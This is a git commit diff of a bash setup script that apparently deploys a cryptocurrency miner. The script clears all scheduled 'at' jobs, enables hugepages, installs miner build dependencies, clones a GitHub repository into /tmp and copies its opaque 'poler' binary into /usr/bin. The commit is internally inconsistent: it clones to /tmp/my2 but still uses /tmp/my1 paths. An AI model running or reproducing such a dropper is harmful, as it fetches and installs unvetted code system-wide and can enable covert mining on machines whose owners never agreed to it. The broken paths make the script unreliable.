622077e154fc613d9d1f6e7c0a0ea40cf498f4f0
not100today <55038774+not100today@users.noreply.github.com>
2019-09-08 01:58:03 -0600

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
 
-rm -rf /tmp/my1/
+rm -rf /tmp/my2/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir my1
-git clone https://github.com/not100today/my1.git /tmp/my1
+cd /tmp && mkdir my2
+git clone https://github.com/not100today/my2.git /tmp/my2
 cd /tmp/my1
-chmod +x /tmp/my1/poler
+chmod +x /tmp/my2/poler
 chmod 777 ./*.sh
 cp /tmp/my1/poler /usr/bin/
 
